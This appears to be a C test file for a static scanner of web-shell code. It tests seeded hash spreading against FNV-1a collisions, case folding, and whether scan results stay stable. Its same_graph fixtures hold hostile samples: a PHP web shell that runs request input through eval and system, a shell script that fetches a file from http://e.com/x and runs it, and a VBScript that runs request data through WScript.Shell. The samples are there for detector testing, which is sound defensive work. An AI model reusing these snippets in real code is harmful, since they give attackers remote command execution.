/*
 * genome / diag_text_seed - the SEEDED HASH of the names in the TEXT route's tables (G1), against the names built to share one FNV-1a hash.
 *
 *   SEED     depends on every byte of the text and on the salt; its low bits are as good as its high ones whatever the salt's (an address ends in zeros), which a first version did not
 *            have: seeds with a handful of zero low bits let names that collide under the unseeded hash collide under the seeded one too (one run in thirty);
 *   SPREAD   the 4096 names that share one FNV-1a hash have a different hash each, and spread over a table, under every seed of a hostile set (0, every single bit, all ones, the
 *            old start state, a thousand salts that are aligned addresses) - not only under the seed one run happened to draw;
 *   SAME     one text scanned over and over (so under a different salt each time, the scans held so that the heap does not hand the same address back) makes one graph: nothing the
 *            route answers depends on the seed;
 *   FOLD     the hash of a name that is folded to lower case is the hash of its lower case spelling, so a table of names that do not tell the cases apart finds them.
 *
 * usage: diag_text_seed
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <phenotype/diag_text_private.h>

#include "diag_text_collide.h"

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

static void seed_quality(void)
{
	uint8_t text[200];
	uint64_t s0, low8_seen[4] = { 0, 0, 0, 0 };
	uint32_t i, distinct = 0, tz7 = 0;

	for (i = 0; i < sizeof text; i++)
		text[i] = (uint8_t)(i * 7u + 3u);
	s0 = kgenome_oatab_seed(text, sizeof text, 0x1000);
	CK(kgenome_oatab_seed(text, sizeof text, 0x1000) == s0, "the seed of one text and one salt is one number");
	CK(kgenome_oatab_seed(text, sizeof text, 0x2000) != s0, "another salt, another seed");
	CK(kgenome_oatab_seed(text, sizeof text - 1u, 0x1000) != s0, "another length, another seed");
	CK(kgenome_oatab_seed(NULL, 0, 0x1000) != kgenome_oatab_seed(NULL, 0, 0x2000), "no text: the salt alone");
	/* every byte of the text counts, in the 8-byte body and in the tail */
	for (i = 0; i < sizeof text; i++) {
		uint8_t save = text[i];

		text[i] = (uint8_t)(save ^ 1u);
		CK(kgenome_oatab_seed(text, sizeof text, 0x1000) != s0, "byte %u of the text does not reach the seed", i);
		text[i] = save;
	}
	/* salts that are addresses: aligned, so their low bits are zero. The seeds they make must not be. */
	for (i = 0; i < 4096; i++) {
		uint64_t s = kgenome_oatab_seed(text, sizeof text, (uintptr_t)i << 12);

		low8_seen[(s & 255u) >> 6] |= 1ull << (s & 63u);
		tz7 += (s & 127u) == 0;
	}
	for (i = 0; i < 4; i++)
		distinct += (uint32_t)__builtin_popcountll(low8_seen[i]);
	CK(distinct >= 250u, "the low 8 bits of 4096 seeds from aligned salts take %u of 256 values", distinct);
	CK(tz7 <= 4096u / 32u, "%u of 4096 seeds from aligned salts have 7 zero low bits (a fair draw has %u)", tz7, 4096u / 128u);
}

static void spread(void)
{
	size_t n, i, t;
	char **names = collide(KOF_HASH_INIT, 12u, &n);
	uint64_t seeds[64 + 6 + 1000];
	size_t ns = 0;
	uint32_t *h = malloc(n * sizeof *h);
	static uint16_t load[8192];

	seeds[ns++] = 0;
	seeds[ns++] = ~0ull;
	seeds[ns++] = KOF_HASH_INIT;
	seeds[ns++] = (uint64_t)KOF_HASH_INIT << 32;
	seeds[ns++] = 1;
	seeds[ns++] = 2;
	for (i = 0; i < 64; i++)
		seeds[ns++] = 1ull << i;
	for (i = 0; i < 1000; i++)
		seeds[ns++] = kgenome_oatab_seed((const uint8_t *)"x", 1, (uintptr_t)i << 12);
	/* the names are 12 pieces of 6 letters that collide from KOF_HASH_INIT under FNV-1a: check it, or the test says nothing */
	for (i = 1; i < n; i++)
		if (fnv_run(KOF_HASH_INIT, names[i], strlen(names[i])) != fnv_run(KOF_HASH_INIT, names[0], strlen(names[0])))
			break;
	CK(i == n, "the generated names share one FNV-1a hash");
	for (t = 0; t < ns; t++) {
		uint32_t max = 0, same = 0;

		memset(load, 0, sizeof load);
		for (i = 0; i < n; i++) {
			h[i] = kgenome_dtx_name_hash(seeds[t], (const uint8_t *)names[i], (uint32_t)strlen(names[i]), 0);
			if (++load[h[i] & 8191u] > max)
				max = load[h[i] & 8191u];
		}
		for (i = 1; i < n; i++)
			same += h[i] == h[0];
		CK(same <= 2u, "seed %016llx: %u of %zu colliding names keep one hash", (unsigned long long)seeds[t], same, n);
		CK(max <= 12u, "seed %016llx: the busiest of 8192 slots holds %u of %zu names (a fair draw holds about 8)", (unsigned long long)seeds[t], max, n);
	}
	free(h);
	names_free(names, n);
}

/* a NUL byte is in no set of bytes: strchr says it is in every one (it finds the terminator), which made it "a byte that continues the line" (G12) */
static void in_set(void)
{
	size_t i;

	CK(!kof_byte_in_set(0, ".?:&|"), "NUL is in a set");
	CK(!kof_byte_in_set(0, ""), "NUL is in the empty set");
	CK(!kof_byte_in_set('a', NULL), "a byte is in no set when there is none");
	for (i = 1; i < 256; i++)
		CK(kof_byte_in_set((uint8_t)i, ".?:&|") == (strchr(".?:&|", (int)i) != NULL), "byte %zu", i);
}

static void fold(void)
{
	static const char *const pairs[][2] = { { "System", "system" }, { "SHELL_EXEC", "shell_exec" }, { "Zz09_", "zz09_" } };
	size_t i;

	for (i = 0; i < sizeof pairs / sizeof pairs[0]; i++) {
		uint32_t a = kgenome_dtx_name_hash(0x1234, (const uint8_t *)pairs[i][0], (uint32_t)strlen(pairs[i][0]), 1);
		uint32_t b = kgenome_dtx_name_hash(0x1234, (const uint8_t *)pairs[i][1], (uint32_t)strlen(pairs[i][1]), 1);
		uint32_t c = kgenome_dtx_name_hash(0x1234, (const uint8_t *)pairs[i][0], (uint32_t)strlen(pairs[i][0]), 0);

		CK(a == b, "%s and %s fold to one hash", pairs[i][0], pairs[i][1]);
		CK(c != b, "%s is not folded where the table is not", pairs[i][0]);
	}
}

static void sig_of(const struct kgenome_diag_scan *s, char *out, size_t cap)
{
	uint32_t i, k;
	size_t n = 0;

	out[0] = 0;
	for (i = 0; i < kgenome_diag_scan_count(s) && n + 80u < cap; i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		n += (size_t)snprintf(out + n, cap - n, "%u:%u:%u[", i, (unsigned)h->cap, (unsigned)h->flags);
		for (k = 0; k < h->n_in; k++)
			n += (size_t)snprintf(out + n, cap - n, "%u/%u/%u/%u ", (unsigned)h->in[k].from, (unsigned)h->in[k].role, (unsigned)h->in[k].kind, (unsigned)h->in[k].how);
		n += (size_t)snprintf(out + n, cap - n, "]");
	}
}

static void same_graph(void)
{
	static const struct { uint32_t lang; const char *text; } T[] = {
		{ KGENOME_TEXTUAL_LANG_PHP, "<?php function x($t){ return gzuncompress(base64_decode($t)); } function y($a,$b){ return $b; } $f=str_replace('k','','ckrekatek_fuknkkction'); "
		  "$s=$f('',$_POST[0]); $s(); eval(x($_POST[1])); $n='sys'.'tem'; $n(y($_GET[0],$_GET[2])); $a1='system'; $a2=$a1; $a2($_GET[3]); global $q; $q=1;\n" },
		{ KGENOME_TEXTUAL_LANG_SH, "#!/bin/sh\nx=/tmp/a\nwget -O $x http://e.com/x\nchmod +x $x\nsh $x\ny=ev; z=al; $y$z \"$(echo hi)\"\n" },
		{ KGENOME_TEXTUAL_LANG_VBS, "a = Request(\"x\")\r\nFunction f(b)\r\nDim c\r\nc = b\r\nCreateObject(\"WScript.Shell\").Run c\r\nf = c\r\nEnd Function\r\nExecute f(a)\r\n" },
	};
	size_t i;

	for (i = 0; i < sizeof T / sizeof T[0]; i++) {
		char ref[8192], got[8192];
		struct kgenome_diag_scan *keep[40];
		int k;

		for (k = 0; k < 40; k++) {
			struct kgenome_diag_text_req rq = { .base = (const uint8_t *)T[i].text, .size = strlen(T[i].text), .lang = T[i].lang };

			keep[k] = kgenome_diag_scan_text(&rq);
			CK(keep[k] != NULL, "scan %d of text %zu", k, i);
			if (!keep[k])
				continue;
			if (k == 0) {
				sig_of(keep[0], ref, sizeof ref);
				CK(kgenome_diag_scan_count(keep[0]) >= 3u, "text %zu makes nodes", i);
			} else {
				sig_of(keep[k], got, sizeof got);
				CK(strcmp(ref, got) == 0, "text %zu, scan %d under another seed: [%s] against [%s]", i, k, got, ref);
			}
		}
		for (k = 0; k < 40; k++)
			if (keep[k])
				kgenome_diag_scan_free(keep[k]);
	}
}

int main(void)
{
	seed_quality();
	spread();
	in_set();
	fold();
	same_graph();
	if (fails) {
		printf("diag_text_seed: %d failure(s)\n", fails);
		return 1;
	}
	printf("diag_text_seed: ok\n");
	return 0;
}
